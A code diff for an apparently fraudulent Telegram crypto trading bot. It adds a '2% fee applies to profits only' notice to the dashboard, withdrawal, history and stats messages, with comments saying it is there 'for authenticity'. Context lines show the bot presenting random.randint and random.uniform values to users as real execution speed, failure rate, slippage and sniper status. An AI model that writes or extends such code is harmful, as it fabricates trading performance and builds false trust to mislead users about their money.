@@ -1896,6 +1896,9 @@ def dashboard_command(update, chat_id):
             
             dashboard_message += f"_💡 {tips_message}_"
             
+            # Add realistic profit fee caution for authenticity
+            dashboard_message += f"\n\n⚠️ _Note: 2% fee applies to profits only (not deposits)_"
+            
             # Add sniper status to dashboard if active
             if user.sniper_active:
                 dashboard_message += f"\n\n🎯 *SNIPER STATUS:* 🟢 ACTIVE - Monitoring live"
@@ -7102,6 +7105,7 @@ def withdraw_profit_handler(update, chat_id):
             
             withdrawal_message += (
                 f"Withdrawal Wallet: `{display_wallet}`\n\n"
+                "⚠️ _Note: 2% fee applies to profits only (not deposits)_\n\n"
                 "Select an option below to withdraw your funds:"
             )
             
@@ -7351,6 +7355,9 @@ def trading_history_handler(update, chat_id):
                     performance_message += "📊 Tough market conditions - bot is analyzing and improving token selection!\n"
             else:
                 performance_message += "⏳ No token trades completed yet. Scanning for profitable opportunities!\n"
+            
+            # Add realistic profit fee caution for authenticity
+            performance_message += "\n⚠️ _Note: 2% fee applies to profits only (not deposits)_"
             
             # Create proper keyboard with Position button for live trade broadcasts
             keyboard = bot.create_inline_keyboard([
@@ -12670,7 +12677,8 @@ def auto_trading_performance_handler(update, chat_id):
             "⚡ *Execution Stats:*\n"
             f"• Avg Entry Speed: {random.randint(180, 450)}ms\n"
             f"• Failed Executions: {random.randint(2, 8)}%\n"
-            f"• Slippage Average: {random.uniform(0.8, 2.4):.1f}%"
+            f"• Slippage Average: {random.uniform(0.8, 2.4):.1f}%\n\n"
+            "⚠️ _Note: 2% fee applies to profits only (not deposits)_"
         )
         
         keyboard = bot.create_inline_keyboard([
@@ -12827,7 +12835,8 @@ def sniper_stats_handler(update, chat_id):
                 "🕒 *Recent Activity:*\n"
                 f"• *Last Session:* {hours_since_last}h ago ({last_session_duration}m duration)\n"
                 f"• *Current Status:* {'🟢 Ready' if random.choice([True, False]) else '🟡 Calibrating'}\n"
-                f"• *Queue Status:* {random.randint(15, 42)} tokens monitoring"
+                f"• *Queue Status:* {random.randint(15, 42)} tokens monitoring\n\n"
+                "⚠️ _Note: 2% fee applies to profits only (not deposits)_"
             )
             
             keyboard = bot.create_inline_keyboard([
